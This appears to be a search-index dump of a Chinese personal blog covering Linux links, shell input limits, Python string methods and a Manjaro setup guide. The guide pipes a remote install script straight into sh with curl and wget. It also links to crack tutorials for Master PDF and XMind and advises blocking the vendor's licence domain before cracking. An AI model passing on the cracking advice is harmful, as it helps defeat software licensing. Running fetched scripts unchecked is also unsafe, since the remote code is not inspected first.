unar，这个工具会自动检测文件的编码，也可以通过 -e来指定： 命令行：<code>unar file.zip</code>， 即可解压出中文文件</p><h2 id="ntfs-只读挂载-read-only-file-system">NTFS 只读挂载: “Read-onlyfile system”</h2><p>Windows 未正常关闭导致的，关闭了 Manjaro, 开机进入Windows，然后正常关机，再进入 Manjaro 即可。</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://blog.kaaass.net/archives/1205#toc-1">Arch Linux(Manjaro) 配置与常用软件安装指南</a></li><li><ahref="https://mrswolf.github.io/zh-cn/2019/05/24/manjaro踩坑记/#rslsync">https://mrswolf.github.io/zh-cn/2019/05/24/manjaro%E8%B8%A9%E5%9D%91%E8%AE%B0/#rslsync</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软硬链接</title>
      <link href="/blog/2020/07/23/linux/tools/links/"/>
      <url>/blog/2020/07/23/linux/tools/links/</url>
      
        <content type="html"><![CDATA[<h2 id="文件">文件</h2><p>文件系统中的数据分为两类，分别是用户数据和元数据。 用户数据(userdata)：指文件数据块 (data block)，数据块是记录文件真实内容的地方元数据(metadata)：指文件的附加属性，如文件大小、创建时间、所有者等信息</p><p>在 Linux 中，元数据中的 inode 号（inode是文件元数据的一部分但其并不包含文件名，inode号即索引节点号）才是文件的唯一标识而非文件名。文件名仅是为了方便人们的记忆和使用，系统或程序通过inode号寻找正确的文件数据块。下图为展示了程序通过文件名获取文件内容的过程。</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200723213341.png"alt="filename_open_file" /><figcaption aria-hidden="true">filename_open_file</figcaption></figure><h2 id="链接文件">链接文件</h2><p>为解决文件的共享使用，Linux系统引入了两种链接：硬链接和符号链接，它们是两种不同的引用文件的方式。</p><h3 id="软硬链接区别">软硬链接区别</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200723213446.png"alt="hard_softlink" /><figcaption aria-hidden="true">hard_softlink</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200723220611.png"alt="hard_softlink" /><figcaption aria-hidden="true">hard_softlink</figcaption></figure><h2 id="符号链接">符号链接</h2><p>符号链接：是一个存储文件（夹）位置的快捷方式，操作系统找这个快捷方式（文件，目录名），然后再引用到</p><p><code>ls -i</code> 查看 inode 号</p><p>创建： <code>ln -s filename soft_ln_nane</code></p><ol type="1"><li>软链接有自己的文件属性及权限等；</li><li>可对不存在的文件或目录创建软链接；</li><li>软链接可交叉文件系统；</li><li>软链接可对文件或目录创建；</li><li>创建软链接时，链接计数 i_nlink 不会增加；</li><li>删除软链接并不影响被指向的文件，但若被指向的原文件被删除，则相关软连接被称为死链接（若被指向路径文件被重新创建，死链接可恢复为正常的软链接）。</li></ol><h2 id="硬链接">硬链接</h2><p>硬链接是有着相同 inode号，仅文件名不同的文件，因此硬链接存在以下几点特性：</p><ol type="1"><li>文件有相同的 inode 及 data block；</li><li>只能对已存在的文件进行创建；</li><li>不能交叉文件系统进行硬链接的创建； inode号仅在各文件系统下是唯一的，当 Linux 挂载多个文件系统后将出现 inode号重复的现象，因此硬链接创建时不可跨文件系统。</li><li>不能对目录进行创建，只可对文件创建；</li><li>删除一个硬链接，并不等于删除文件， 直到文件的引用计数为 0时，文件才会被删除。</li></ol><h2 id="参考文章">参考文章</h2><p><ahref="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html">理解Linux 的硬链接与软链接</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hardlink </tag>
            
            <tag> softlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell input 4096-limit</title>
      <link href="/blog/2020/07/23/programming/shell/shell_input_limit/"/>
      <url>/blog/2020/07/23/programming/shell/shell_input_limit/</url>
      
        <content type="html"><![CDATA[<h2 id="问题">问题</h2><p>Linux shell 命令行每次收取 4096个字符的输入(4kB)，输入的字符个数超过该数字后面的被丢弃。原因是 shell的输入是为人设计的，而人不会手动输入那么多。如果想要在 shell 里面运行shell、python 脚本获取大于 4096个字符的输入时，可以使用<strong>读取文件或者文件输出重定向的方式</strong>。</p><p>这个问题是我在 hackerrank 上刷一道 python题目的时候，调试大量输入的时候发现的。在网上查找了半天发现的，加油，学呀。</p><h2 id="参考链接">参考链接</h2><blockquote><ol type="1"><li><a href="http://blog.chaitanya.im/4096-limit">Why is there a 4096character limit on text input in the shell</a></li><li><ahref="https://stackoverflow.com/questions/52250059/bash-read-discards-terminal-line-input-after-4096-bytes">bash:read discards terminal line input after 4096 bytes 这个是关于 read的，也可以看一下</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>String Tokenization</title>
      <link href="/blog/2020/07/23/programming/python/str_tokenize/"/>
      <url>/blog/2020/07/23/programming/python/str_tokenize/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Tokenization is the process of dividing text into a set of meaningfulpieces. These pieces are called tokens. For example, we can divide achunk of text into words, or we can divide it into sentences.</p><p>Tokenization is the process of tokenizing or splitting a string, textinto a list of tokens. One can think of token as parts like a word is atoken in a sentence, and a sentence is a token in a paragraph.</p><h2 id="references">References</h2><blockquote><p><ahref="https://www.oreilly.com/library/view/python-machine-learning/9781786464477/ch06s02.html">Preprocessingdata using tokenization</a> &gt; <ahref="https://www.geeksforgeeks.org/nlp-how-tokenizing-text-sentence-words-works/">NLP| How tokenizing text, sentence, words works</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro 系统配置</title>
      <link href="/blog/2020/07/23/linux/manjaro/manjaro_config/"/>
      <url>/blog/2020/07/23/linux/manjaro/manjaro_config/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>用了 Manjaro 有半年左右了，之前用了Ubuntu，总是讨厌它祖传的内部错误，后面装了黑苹果，感觉也不是很好用，而且到处都是花钱的软件，有些质量还没有 Windows上免费的好用。后面听说过 Manjaro不错，便装上了双系统，一直用到现在，目前主力系统是 Manjaro,需要腾讯系软件或者 Microsoft Office 时，才会切换到 Windows, 越来越感觉Manjaro 好用了。它自带的很多软件的功能都远远超过了 Windows 自带的，而且Linux 的桌面环境远远强于 Windows 桌面环境。</p><p>Manjaro Linux（或简称 Manjaro）是基于 Arch Linux 的 Linux发行版。</p><p>特点：</p><ul><li>对显卡驱动的兼容性极其之高，可自主选择安装开源驱动或者闭源驱动。</li><li>采用滚动更新（意味着用户无需通过重装系统或系统更新来更新自己的操作系统）。而且对Arch 稳定性和激进度平衡控制极好。</li><li>AUR 软件仓库有着世界上最齐全的 Linux 软件</li><li>最强大丰富的 wiki和活跃的社区让所有问题都可以快速得到满意的答案</li><li>Manjaro 提供支持的桌面环境众多，这里我选择的是一个 <strong>ManjaroKDE</strong>，KDE 操作界面类似 Windows 的操作界面</li></ul><h2 id="初始化配置">初始化配置</h2><p>配置当下在国内最快的镜像源，我这边一般是清华源和阿里源比较快。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br></pre></td></tr></table></figure><p>不一会，它会弹窗让你选择源，你根据显示的延迟，选延迟最低的就好。</p><h3 id="配置-archlinux-仓库源">配置 ArchLinux 仓库源</h3><ol type="1"><li><p>先安装一下 vim 便于后续操作</p><p><code>sudo pacman -S vim</code> 如果此时安装不了，那先更新一下系统：<code>sudo pacman -Syyu</code></p></li><li><p>修改配置文件，添加使用清华源</p><p><code>sudo vim /etc/pacman.conf</code> 向该文件末尾增加下面语句（<code>shift+g</code> 跳到文件末尾， <code>i</code><code>编辑，esc</code> 退出编辑， <code>shift+z</code>连续两下保存退出）</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel= TrustedOnly</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch</span><br></pre></td></tr></table></figure></p></li><li><p>安装密钥</p><p><code>sudo pacman -Syu archlinuxcn-keyring</code> 如果遇到了<strong>Unable to lock database</strong> 错误：执行命令：<code>sudo rm /var/lib/pacman/db.lck</code></p></li></ol><h3 id="更新系统">更新系统</h3><p>更新系统： <code>sudo pacman -Syyu</code> 让 Manjaro 使用LocalTime，解决与 Windows 共存主板时间冲突问题：<code>sudo timedatectl set-local-rtc true</code></p><h2 id="安装配置-aur-包管理">安装配置 aur 包管理</h2><p><code>sudo pacman -S yay</code> Yay 默认使用法国的<code>aur.archlinux.org</code> 作为 AUR源，可以更改为国内清华大学提供的镜像。</p><p>yay 用户执行以下命令修改 au­rurl：</p><p><code>yay --aururl "https://aur.tuna.tsinghua.edu.cn" --save</code>修改的配置文件位于 <code>~/.config/yay/config.json</code>注：这两天清华源崩了，不知道后面会不会好。</p><h2 id="常用命令">常用命令</h2><p>安装软件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Ss string             # 在包数据库中查询软件</span><br><span class="line">sudo pacman -S package_name        # 安装软件</span><br><span class="line">sudo pacman -U package.tar.zx      # 从本地文件安装</span><br><span class="line">sudo pacman -R package_name        # 删除单个软件</span><br></pre></td></tr></table></figure><p>上述所有 pacman xxx 命令，均可替换成 yay xxx 执行</p><h2 id="必备工具">必备工具</h2><p><code>sudo pacman -S git net-tools iproute2 tree vim</code></p><h3 id="输入法">输入法</h3><ul><li>Arch based Linux 建议使用的 fcitx 框架， 因为据说开发者是 Arch Linux用户</li><li>RIME 中州韵输入法是 Linux 下广受好评的中文输入法。</li><li>Fcitx5 目前使用很体验不错了</li></ul><p>截止本文更新日期之际，目前较好的解决方案有两种：</p><ol type="1"><li><p>fcitx4/fcitx5 + rime + 词库</p><p><ahref="https://github.com/violetu/mybackup/tree/master/configurations/rime_config">我的rime 配置</a>除了常用词典外，我还单独将搜狗词库中与计算机，软件，网络，安全，黑客相关词汇转换添加了进去。</p></li><li><p>fcitx5 自带的 pingyin + 肥猫维基百万大词库（推荐）</p><p>安装教程：<ahref="https://violetus.life/os/manjaro/fcitx5/">fcitx5、输入法、词库安装配置</a></p></li><li><p>其他（个人不推荐）</p><ol type="1"><li><p>搜狗，主要是因为它还是基于 Qt4， bug还有一些影响体验，还要关闭云输入解决了 CPU飙升问题，而且还是搜狗，你懂的。</p></li><li><p>百度拼音， 今年才出，用了一段时间还行，bug还是有一些，不过不太影响体验，不过，百度，你懂的，用着心里隔应。</p></li></ol></li></ol><p>有上面提到的两种仅仅使用开源软件的好的解决方案，为什么不用？它不香嘛</p><h3 id="浏览器">浏览器</h3><p><code>sudo pacman -S firefox google-chrome</code></p><ul class="task-list"><li><label><input type="checkbox" />待补充， Plasma integration 插件，kde 配合</label></li></ul><h3 id="科学上网">科学上网</h3><ol type="1"><li><p>软件安装</p><p>shadowsocks v5，安装小飞机： <code>sudo pacman -S electron-ssr</code>v2ray， 我习惯使用 Qv2ray： <code>sudo pacman -S qv2ray</code> 进阶：Qv2ray 高级路由配置 1. <ahref="https://qv2ray.github.io/manual/route.html#%E5%85%A8%E5%B1%80%E8%B7%AF%E7%94%B1%E8%A7%84%E5%88%99">高级路由设置</a>2. <ahref="https://github.com/Loyalsoldier/v2ray-rules-dat">v2ray-rules-dat</a></p></li><li><p>订阅</p><p><code>electron-ssr</code> 只能订阅 ssr, 而 Qv2ray 不仅默认支持 v2ray的 vmess 协议，通过插件还可以支持支持 ssr， 因此，我目前只用 qv2ray了</p></li></ol><h3 id="终端代理">终端代理</h3><p>proxychains-ng 原理 简单的说就是这个程序 Hook 了 sockets相关的操作，让普通程序的 sockets 数据走 SOCKS/HTTP 代理。</p><ol type="1"><li><p>安装</p><p><code>sudo pacman -S proxychains-ng</code></p></li><li><p>置代理协议与端口</p><p><code>vim /etc/proxychains.conf</code> 将该文件里面的<code>socks4 127.0.0.1 9095</code> 形式的那一行，改为<code>socks5 127.0.0.1 1080</code> 。 注意： <code>1080</code>该值，应为你自己的代理软件监听代理的端口，需要自行在代理软件配置那里获得。</p></li><li><p>使用</p><p>在命令前加上 <code>proxychains4</code> 即可。 测试命令：<code>proxychains4 curl www.google.com</code></p></li></ol><p><strong>Notice</strong>：</p><p>如果你没有修改 yay 的源的话，使用 yay下载官方仓库的东西时，可能会很慢，需要代理。但是 <code>yay</code>由于本身原因，不支持 proxychains 代理，你可重新编译其他版本 yay或者使用临时环境变量设置 HTTP代理（端口同样是需要在代理软件配置那里获得）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy=&quot;http://127.0.0.1:8888&quot;</span><br><span class="line">export http_proxy=&quot;http://127.0.0.1:8888&quot;</span><br></pre></td></tr></table></figure><h2 id="编程开发">编程开发</h2><h3 id="zshoh-my-zsh">zsh/oh-my-zsh</h3><h4 id="切换-zsh">切换 zsh</h4><p>Manjaro linux 默认安装了 zsh 查看本地有哪几种 shell：<code>cat /etc/shells</code> 切换 shell 到 zsh：<code>chsh -s /bin/zsh</code></p><ol type="1"><li><p>默认终端启动 zsh 需要在终端中进行配置：</p><p><code>Ctrl+Alt+t</code> 快捷键打开 <code>Konsole</code> ， 进入:<code>Settings -&gt; configure Konsole -&gt; Profile</code> ，然后右侧<code>New</code> ，名字随意，Command 填写 <code>/usr/bin/zsh</code>，然后 Apply， OK</p></li></ol><h4 id="oh-my-zsh-配置">oh-my-zsh 配置</h4><ol type="1"><li><p>下载安装</p><p><strong>注意： root用户和普通用户需要单独安装配置，即分别切换到普通和 root用户安装</strong></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl 或者是 wget，二者选其一即可</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">via curl</span></span><br><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">via wget</span></span><br><span class="line">sh -c &quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">想要卸载oh-my-zsh 输入以下命令</span></span><br><span class="line">uninstall_oh_my_zsh</span><br></pre></td></tr></table></figure></p></li><li><p>常用插件安装</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">语法高亮插件 zsh-syntax-highlighting</span></span><br><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自动补全插件</span></span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></p></li><li><p>安装完后启用插件</p><p><code>sudo vim ~/.zshrc</code> 搜索到 plugins，在括号后括号里添加安装的插件名字</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plugins=( git</span><br><span class="line">            zsh-autosuggestions</span><br><span class="line">            zsh-syntax-highlighting</span><br><span class="line">            )</span><br></pre></td></tr></table></figure></p></li><li><p>使其在当前 shell 中生效</p><p><code>source ~/.zshrc</code></p></li></ol><h3 id="ideeditor">IDE/Editor</h3><p>PyCharm 和 vscode</p><p><code>sudo pacman -S pycharm-professional visual-studio-code-bin</code></p><h3 id="go">GO</h3><p><code>yay -S go go-tools</code></p><h3 id="oracle-jdk8">Oracle jdk8</h3><p>当然，目前大部分应用都开始使用 java 11 或者 java 13了，但是安装教程不变，把对应包，数字等朝着改就行了（我懒得改了）.</p><ol type="1"><li><p>去 oracle 官网下载 tar 包， 我下载的是：<code>jdk-8u241-linux-x64.tar.gz</code></p></li><li><p>将其移动到 <code>~/Download</code> 目录下</p></li><li><p>在该路径下打开终端， 输入 <code>yay jdk8</code></p></li><li><p>选择和你下载的包名一致的那个</p><p>可以使用 <code>yay jdk8|grep 8u241</code> ，找到他是第几个，然后在运行 <code>yay jdk8</code>，输入序号即可。</p></li><li><p>点击 jar 包，运行</p><ol type="1"><li>配置: jar 包上，右键 open with， 在空行中输入<code>java -jar</code></li><li>在几乎最下方勾选 勾选框， 使得所有 jar 包都可以这样执行。</li></ol></li></ol><h3 id="docset-离线文档">Docset 离线文档</h3><p><code>yay -S zeal</code></p><h2 id="办公生产力">办公生产力</h2><h3 id="office">Office</h3><p>目前的 WPS 和 Libreoffice 对 msoffice兼容还是不太行，不过，有的格式（有的文档）前者兼容好，有的后者兼容好。</p><ol type="1"><li><p>office</p><p><code>sudo pacman -S ttf-wps-fonts wps-office</code></p></li><li><p>Libreoffice</p><p><code>yay -S libreoffice</code></p></li><li><p>PDF 查看编辑</p><ol type="1"><li><p>自带的 PDF 查看器：Okular</p></li><li><p>PDF 编辑/查看器</p><p>Windows 下 Foxit 的企业版功能极其强大，但是 Linux下可以比肩的几乎没有，较好的有两款：</p><ol type="1"><li><p>Master PDF 5.6.20 最新版本，亲测可破解</p><p>安装： <code>yay -S masterpdfeditor</code> 破解教程：<ahref="https://blogs.porterpan.top/linuxPDF/">跨平台好用且小巧的 pdf阅读器</a> 注意：破解前先屏蔽访问： <code>code-industry.net</code>，屏蔽方法很多，可以写入 host 映射到 localhost, 也先对 master pdf设置代理，然后通过 Qv2ray 路由功能屏蔽。</p></li><li><p>PDF studio</p><p>破解教程：也可以找到，我下载了一份免安装破解版的，但是忘了在哪里下载的了emm。</p></li></ol></li></ol></li></ol><h3 id="邮件">邮件</h3><ol type="1"><li><p>thunderbird</p><p>插件： <code>Lighting</code> 和<code>Provider for Google Calendar</code></p></li><li><p>birdtray(用来后台监控邮件消息，即时弹窗显示)</p></li></ol><h3 id="todoist-linux-非官方客户端">Todoist Linux 非官方客户端</h3><p><code>yay -S elementary-planner-git</code> <ahref="https://aur.archlinux.org/packages/elementary-planner-git/">elementary-planner</a>搭配 KDE 插件 Event Calendar 搭配 Todoist, Google Calendar 同步</p><h3 id="文献阅读管理">文献阅读，管理</h3><p>Zotero 文献管理，copytranslator 论文翻译助手</p><p><code>yay -S zotero copytranslator-appimage</code></p><h3 id="思维导图">思维导图</h3><p>Xmind ZEN 跨平台的思维导图工具</p><p>安装： <code>yay -S xmind-zen</code> 破解教程：<ahref="https://www.ghpym.com/xmindzen.html">XMind 2020 (10.1.3) 全平台完美破解版</a></p><h3 id="电子书">电子书</h3><p>电子书管理 calibre， 电子书阅读 foliate 或者 bookworm</p><p><code>yay -S foliate calibre</code></p><h3 id="字典">字典</h3><p><code>yay -S goldendict</code></p><h3 id="坚果云">坚果云</h3><p><code>yay -S nutstore-experimental</code></p><h2 id="影音图像">影音图像</h2><h3 id="影音">影音</h3><ol type="1"><li><p>视频</p><p>默认的 VLC 很棒</p></li><li><p>音频</p><p>本地音乐播放器 默认的 Cantata 作为本地音乐播放器很棒推荐的在线音乐播放器： 网易云音乐：<code>sudo pacman -S netease-cloud-music</code> listen1：<code>sudo pacman -S listen1-desktop</code> Spotify：<code>sudo pacman -S spotify</code> 目前在用 listen1和网易云音乐（注：目前网易云的包不能搜索中文，我几乎不用搜索，所以没管它）</p></li><li><p>视频录像</p><p><code>yay -S simplescreenrecorder</code></p></li></ol><h3 id="图像">图像</h3><ol type="1"><li><p>图像</p><ol type="1"><li><p>看图自带的 Gwenview</p></li><li><p>简单画图 KolourPaint， 类似 Microsoft Paint</p><p><code>sudo pacman -S kolourpaint</code></p></li><li><p>简单修图，编辑图片 pinta</p><p><code>sudo pacman -S pinta</code> 最近才下载使用pinta，未深度使用，效果暂定</p></li></ol></li><li><p>截图</p><p>自带的 Spectacle 与 Flameshot 贴图</p><p><code>yay -S flameshot</code></p></li><li><p>换壁纸软件</p><p>variety 全平台最好的静态壁纸软件，没有之一<code>yay -S variety</code></p></li></ol><h2 id="kde-环境配置">KDE 环境配置</h2><h3 id="open-files">Open Files</h3><p>KDE 默认是单击打开文件，但是作为前 Windows用户，我不是很习惯，改：</p><p><code>System Settings &gt; Workspace Behavior &gt; General Behavior &gt; Click Behavior &gt; Double-Click to open files and folders(single click to select) .</code></p><h3 id="screen-edge">Screen Edge</h3><p>作为前 Windows用户，极其不习惯当鼠标移动到左上角显示桌面的手势操作，关了它：</p><p><code>System Settings &gt; Workspace Behavior &gt; Screen Edges</code>，单击下图中箭头指的那个亮块（对，它是能点的，然后有菜单，选择 No action即可）</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200724101651.png"alt="Screen Edges" /><figcaption aria-hidden="true">Screen Edges</figcaption></figure><h3 id="整体字体太小">整体字体太小</h3><p>修改字体和 DPI：<code>System Settings &gt; Workspace Behavior &gt; Fonts</code></p><p>我的配置如图：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200724102022.png"alt="fonts" /><figcaption aria-hidden="true">fonts</figcaption></figure><h3 id="dock">Dock</h3><p><code>yay -S latte-dock-git</code></p><h2 id="其他">其他</h2><h3 id="virtualbox">virtualbox</h3><p><ahref="https://wiki.manjaro.org/index.php?title=Virtualbox#Install_VirtualBox">VirtualBoxmanjaro 安装</a></p><p>注意以下： <code>linux54-virtualbox-host-modules</code> 中的 54对应自己内核的数字</p><p><ahref="https://blog.csdn.net/wow4464/article/details/51778449">VirtualBox虚拟机全屏显示</a></p><p>安装扩展支持 USB 3.0</p><p><code>yay -S virtualbox-ext-oracle</code></p><h3 id="远程">远程</h3><p><code>yay -S remmina teamviewer</code></p><h3 id="下载">下载</h3><p><code>yay -S baidunetdisk-bin aria2 xdman</code></p><h3 id="tim">Tim</h3><p><code>yay -S deepin-wine-tim</code></p><h2 id="网络安全">网络、安全</h2><ol type="1"><li><code>netcat</code> 包含在 <code>nmap</code> 包里面</li><li><code>dig</code> , <code>host</code> , <code>nslookup</code> ，<code>ip</code> （全名： <code>iproute2</code> ， 使用时直接<code>ip</code> ）都在 <code>bind-tools</code> 包里。</li><li><code>dsniff</code> ： 包含 <code>arpspoof</code> 命令</li><li><code>fping</code> ， <code>traceroute</code></li><li><code>macchanger</code> ：改变 mac 地址</li></ol><p>安装：<code>yay -S bind-tools fping traceroute nmap sqlmap macchanger dsniff</code></p><h3 id="wireshark-安装">wireshark 安装</h3><p><code>yay -S wireshark-qt</code> 将用户加入 wireshark 组：<code>gpasswd -a username wireshark</code> （username改为你的用户名）</p><h2 id="参考文章">参考文章</h2><blockquote><ol type="1"><li><a href="https://blog.triplez.cn/manjaro-quick-start/">将干净的Manjaro 快速配置为工作环境</a></li><li><a href="https://sshwy.gitee.io/2019/04/14/24636/">Yay使用小记</a></li><li><a href="https://www.cnblogs.com/tomyyyyy/p/12902714.html">Manjaro配置</a></li><li><a href="https://github.com/rofl0r/proxychains-ng">Githubproxychains-ng</a></li><li><a href="https://www.cnblogs.com/misfit/p/10694397.html">Oh-My-Zsh及主题、插件安装与配置</a></li><li><a href="https://zh.wikipedia.org/wiki/Manjaro_Linux">ManjaroLinux</a></li><li><ahref="https://www.edureka.co/community/37886/not-able-to-install-arpspoof">Notable to install arpspoof</a></li><li><a href="https://zhuanlan.zhihu.com/p/65767238">Manjaro安装套路</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__str__、__repr__ 和 __ascii__</title>
      <link href="/blog/2020/07/22/programming/python/2.object-oriented/str_repr/"/>
      <url>/blog/2020/07/22/programming/python/2.object-oriented/str_repr/</url>
      
        <content type="html"><![CDATA[<p>当你直接输出一个自定义对象时，输出结果来自于：</p><ol type="1"><li>你重写的，<code>__str__</code> 的返回值</li><li>如果你没有重写 <code>__str__</code>， 则使用你重写的<code>__repr__</code> 的返回值</li><li>如果你两个都没有重写，则不输出东西。</li></ol><h2 id="repr__"><code>__repr__</code></h2><p><code>__repr__</code>（representations of pythonobject）的目的为了更加使意思清楚，消除歧义。它是给开发者准备的，用来调试。</p><p>功能：</p><ol type="1"><li><p>为了是 shi该对象更容易被程序员理解。终端用户输出一些信息</p></li><li><p>断点调试 通过重写 “<strong>repr</strong>()”,输出对象的时候，可以输出该对象的详细信息，为你 Debug等提供帮助。</p></li><li><p>建议为任何自定义的类重写 <code>__repr__</code></p></li><li><p>Container’s <code>__str__</code> uses contained objects<code>__repr__</code></p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obj</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;this is  __str__, it&#x27;s value is <span class="subst">&#123;self.value&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;this is  __repr__, it&#x27;s value is <span class="subst">&#123;self.value&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">a = obj(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;!r&#125;\n\n&#123;!s&#125;&quot;</span>.<span class="built_in">format</span>(a.__repr__, a.__str__))</span><br></pre></td></tr></table></figure><h2 id="str__"><code>__str__</code></h2><p><code>__str__</code> 的目的为了可读性，是为（终端）用户准备的</p><p><code>str()</code> 函数调用的就是对象的 <code>__str__</code>方法。</p><p>如果你希望有一个字符串版本的可读性比较好的输出，那么再实现一下<code>__str__</code></p><p>!s (apply str()) and !r (apply repr()) can be used to convert thevalue before it is formatted.</p><h2 id="section"></h2><p>It just calls the repr of the value supplied.</p><p>It's usage is generally not really needed with f-strings since withthem you can just do repr(self.radius) which is arguably more clear inits intent.</p><p>!r (repr), !s (str) and !a (ascii) were kept around just to easecompatibility with the str.format alternative, you don't need to usethem with f-strings.</p><h2 id="references">References</h2><p><ahref="https://medium.com/swlh/string-representations-in-python-understand-repr-vs-str-12f046986eb5">StringRepresentations in Python — Understand repr() vs. str()</a> <ahref="https://stackoverflow.com/questions/38418070/what-does-r-do-in-str-and-repr">Whatdoes !r do in str() and repr()?</a> <ahref="https://stackoverflow.com/questions/44800801/in-python-format-f-string-strings-what-does-r-mean">InPython format (f-string) strings, what does !r mean?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 安装目录，修改，pip 默认包安装位置</title>
      <link href="/blog/2020/07/21/programming/python/issues/py_config/"/>
      <url>/blog/2020/07/21/programming/python/issues/py_config/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />wait to be learned</label></li></ul><h2 id="参考资料">参考资料</h2><blockquote><p><a href="https://docs.python.org/3/library/site.html">site —Site-specific configuration hook</a> &gt; <ahref="https://blog.csdn.net/ZCShouCSDN/article/details/84990674">Python之 新手安装详解 、安装目录说明 及 修改 pip 默认包安装位置</a> &gt; <ahref="https://frostming.com/2019/03-13/where-do-your-packages-go">你的Python 包都装到哪了？</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python root 用户报错 ModuleNotFoundError</title>
      <link href="/blog/2020/07/21/programming/python/issues/sudo_no_mod/"/>
      <url>/blog/2020/07/21/programming/python/issues/sudo_no_mod/</url>
      
